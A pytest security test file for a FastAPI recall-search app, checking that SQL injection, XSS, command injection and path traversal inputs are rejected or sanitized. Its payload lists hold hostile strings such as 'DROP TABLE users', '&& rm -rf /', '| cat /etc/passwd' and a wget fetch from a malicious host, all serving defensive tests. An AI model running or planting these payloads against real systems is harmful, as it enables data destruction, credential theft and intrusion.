"""
Input Validation Security Tests - Phase 2

Tests input validation and injection prevention including SQL injection, XSS,
command injection, and path traversal attacks.

Author: BabyShield Development Team
Date: October 11, 2025
"""

import pytest
from fastapi.testclient import TestClient

from api.main_babyshield import app


@pytest.fixture
def test_client():
    """FastAPI test client."""
    return TestClient(app)


@pytest.fixture
def auth_headers():
    """Authentication headers with valid JWT token."""
    from api.auth_endpoints import create_access_token

    token = create_access_token(data={"sub": "test@example.com"})
    return {"Authorization": f"Bearer {token}"}


# ====================
# INPUT VALIDATION TESTS
# ====================


@pytest.mark.security
@pytest.mark.integration
def test_sql_injection_prevention(test_client, auth_headers):
    """
    Test prevention of SQL injection attacks.

    Acceptance Criteria:
    - Parameterized queries prevent SQL injection
    - Input sanitization on search fields
    - Error messages don't reveal database structure
    - Union-based injection blocked
    - Boolean-based injection blocked
    - Time-based injection blocked
    """
    # Test 1: Classic SQL injection in search
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL, NULL, NULL--",
        "admin' --",
        "' OR 'a'='a",
        "1' AND '1' = '1",
    ]

    for payload in sql_payloads:
        response = test_client.get(f"/api/v1/recalls/search?query={payload}", headers=auth_headers)

        # Should return 200 with empty results or 422 validation error
        # Should NOT return 500 server error or database error
        assert response.status_code in [200, 422]

        if response.status_code == 200:
            data = response.json()
            # Should not return all records or unexpected data
            assert isinstance(data, dict)
            if "items" in data:
                # Verify normal behavior, not injection success
                assert len(data["items"]) < 1000  # Not all records

    # Test 2: SQL injection in POST endpoint
    injection_data = {"product_name": "'; DELETE FROM recalls WHERE '1'='1", "manufacturer": "' OR 1=1 --"}

    response = test_client.post("/api/v1/products", json=injection_data, headers=auth_headers)

    # Should validate and reject, not execute SQL
    assert response.status_code in [422, 400]

    # Test 3: Verify parameterized queries used
    # Legitimate search should work normally
    response = test_client.get("/api/v1/recalls/search?query=baby monitor", headers=auth_headers)
    assert response.status_code == 200


@pytest.mark.security
@pytest.mark.integration
def test_xss_script_sanitization(test_client, auth_headers):
    """
    Test XSS (Cross-Site Scripting) prevention.

    Acceptance Criteria:
    - Strip <script> tags from input
    - Escape HTML entities
    - Prevent event handler injection
    - Sanitize user-generated content
    - Clean feedback/comment submissions
    - Verify output encoding
    """
    # Test 1: Script tag injection
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<IMG SRC=\"javascript:alert('XSS');\">",
    ]

    for payload in xss_payloads:
        # Test in feedback submission
        response = test_client.post(
            "/api/v1/feedback",
            json={"type": "suggestion", "subject": "Test Feedback", "message": payload},
            headers=auth_headers,
        )

        # Should accept but sanitize
        assert response.status_code in [200, 201, 422]

        if response.status_code in [200, 201]:
            data = response.json()
            # Verify script was sanitized, not stored as-is
            if "message" in data:
                assert "<script>" not in data["message"].lower()
                assert "onerror" not in data["message"].lower()
                assert "javascript:" not in data["message"].lower()

    # Test 2: HTML entity encoding
    response = test_client.post(
        "/api/v1/feedback",
        json={"type": "bug_report", "subject": "Bug Report", "message": "<b>Bold text</b> & special chars: < > \" ' &"},
        headers=auth_headers,
    )

    if response.status_code in [200, 201]:
        data = response.json()
        # HTML should be escaped or stripped
        message = data.get("message", "")
        # Check that dangerous content is sanitized
        assert "<b>" not in message or "&lt;b&gt;" in message

    # Test 3: Profile update with XSS
    response = test_client.put(
        "/api/v1/user/profile",
        json={
            "first_name": "<script>alert('XSS')</script>John",
            "last_name": "Doe<img src=x onerror=alert('XSS')>",
            "bio": "My bio with <script>malicious code</script>",
        },
        headers=auth_headers,
    )

    # Should sanitize before saving
    if response.status_code == 200:
        data = response.json()
        assert "<script>" not in str(data).lower()


@pytest.mark.security
@pytest.mark.integration
def test_command_injection_prevention(test_client, auth_headers):
    """
    Test prevention of command injection attacks.

    Acceptance Criteria:
    - File operations don't execute shell commands
    - Input validation for file names
    - No shell=True in subprocess calls
    - Whitelist allowed characters
    - Reject pipe and redirection operators
    - Sanitize system paths
    """
    # Test 1: Command injection in file operations
    command_payloads = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "`whoami`",
        "$(uname -a)",
        "; wget http://malicious.com/script.sh",
        "|| echo vulnerable",
    ]

    for payload in command_payloads:
        # Test in export filename
        response = test_client.post(
            "/api/v1/reports/export", json={"format": "pdf", "filename": f"report{payload}.pdf"}, headers=auth_headers
        )

        # Should reject invalid filename
        assert response.status_code in [422, 400]

        if response.status_code == 400:
            data = response.json()
            assert "invalid" in data["detail"].lower() or "filename" in data["detail"].lower()

    # Test 2: Valid filename should work
    response = test_client.post(
        "/api/v1/reports/export", json={"format": "pdf", "filename": "recall_report_2024.pdf"}, headers=auth_headers
    )
    # Should succeed or properly fail for other reasons
    assert response.status_code in [200, 201, 202, 404, 422]

    # Test 3: Command injection in search queries
    response = test_client.get("/api/v1/recalls/search?query=test`whoami`", headers=auth_headers)

    # Should treat as literal string, not execute
    assert response.status_code in [200, 422]


@pytest.mark.security
@pytest.mark.integration
def test_file_upload_path_traversal_prevention(test_client, auth_headers):
    """
    Test prevention of path traversal attacks in file uploads.

    Acceptance Criteria:
    - Block ../ in file paths
    - Block absolute paths
    - Validate file extensions
    - Use secure file storage
    - Generate random filenames
    - Restrict access to upload directory
    """
    from io import BytesIO

    # Test 1: Path traversal attempts
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../database.db",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
    ]

    for payload in traversal_payloads:
        # Create fake file upload
        file_content = BytesIO(b"malicious content")

        response = test_client.post(
            "/api/v1/upload", files={"file": (payload, file_content, "text/plain")}, headers=auth_headers
        )

        # Should reject traversal attempts
        assert response.status_code in [422, 400]

        if response.status_code == 400:
            data = response.json()
            assert "invalid" in data["detail"].lower() or "path" in data["detail"].lower()

    # Test 2: Valid filename should work
    valid_file = BytesIO(b"valid image content")
    response = test_client.post(
        "/api/v1/upload", files={"file": ("product_image.jpg", valid_file, "image/jpeg")}, headers=auth_headers
    )
    # Should succeed
    assert response.status_code in [200, 201]

    if response.status_code in [200, 201]:
        data = response.json()
        # Verify filename was sanitized
        assert "filename" in data
        assert ".." not in data["filename"]
        assert "/" not in data["filename"]
        assert "\\" not in data["filename"]

    # Test 3: Attempt to overwrite system files
    system_files = [
        ".env",
        "config.py",
        "database.db",
        "secrets.json",
        "../api/main.py",
    ]

    for filename in system_files:
        file_content = BytesIO(b"malicious overwrite")
        response = test_client.post(
            "/api/v1/upload", files={"file": (filename, file_content, "text/plain")}, headers=auth_headers
        )

        # Should reject or generate safe filename
        if response.status_code in [200, 201]:
            data = response.json()
            # Filename should be different/sanitized
            assert data["filename"] != filename

    # Test 4: Null byte injection
    response = test_client.post(
        "/api/v1/upload", files={"file": ("image.jpg\x00.php", BytesIO(b"content"), "image/jpeg")}, headers=auth_headers
    )

    # Should sanitize null bytes
    if response.status_code in [200, 201]:
        data = response.json()
        assert "\x00" not in data["filename"]

    # Test 5: Extension whitelist
    dangerous_extensions = [
        "evil.exe",
        "malware.sh",
        "script.php",
        "backdoor.jsp",
        "virus.bat",
    ]

    for filename in dangerous_extensions:
        response = test_client.post(
            "/api/v1/upload",
            files={"file": (filename, BytesIO(b"content"), "application/octet-stream")},
            headers=auth_headers,
        )

        # Should reject dangerous file types
        assert response.status_code in [422, 400, 415]
